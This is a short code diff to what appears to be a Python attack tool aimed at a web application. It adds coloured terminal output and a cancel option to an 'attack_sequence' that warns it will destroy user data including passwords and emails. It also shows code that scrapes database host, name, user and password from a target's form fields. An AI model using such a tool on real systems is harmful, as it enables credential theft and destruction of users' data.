@@ -35,9 +35,13 @@ class Target(object):
 		time.sleep(.050)
 
 	def attack_sequence(self):
-		Target.info("Most user data (including current password and email) will be destroyed")
-		Target.info("You have 10 seconds to cancel")
-		time.sleep(10)
+		Target.info("Most user data (including current password and email) will be \x1B[91mdestroyed\x1B[0m")
+		Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
+		try:
+			time.sleep(10)
+		except:
+			Target.bad("\nUser stopped attack. Leaving...")
+			exit(0)
 		self.keep_user()
 		self.attack_password()
 		self.place_user()
@@ -79,19 +83,19 @@ class Target(object):
 		for line in html:
 			if line.find('name="host"') != -1:
 				self.db_host = line.split('"')[9]
-				Target.good("Setting '"+self.db_host+"' as database host")
+				Target.good("Setting '\x1B[35m"+self.db_host+"\x1B[0m' as database host")
 			if line.find('name="data"') != -1:
 				self.db_name = line.split('"')[9]
-				Target.good("Setting '"+self.db_name+"' as database name")
+				Target.good("Setting '\x1B[35m"+self.db_name+"\x1B[0m' as database name")
 			if line.find('name="user"') != -1:
 				self.db_user = line.split('"')[9]
-				Target.good("Setting '"+self.db_user+"' as database user")
+				Target.good("Setting '\x1B[35m"+self.db_user+"\x1B[0m' as database user")
 			if line.find('name="pass"') != -1:
 				self.db_pass = line.split('"')[9]
-				Target.good("Setting '"+self.db_pass+"' as database password")
+				Target.good("Setting '\x1B[35m"+self.db_pass+"\x1B[0m' as database password")
 			if line.find('name="char"') != -1:
 				self.db_char = line.split('"')[9]
-				Target.good("Setting '"+self.db_char+"' as charset")
+				Target.good("Setting '\x1B[35m"+self.db_char+"\x1B[0m' as charset")
 
 	def sanitizeUrl(self,url):
 		if "://" not in url: 
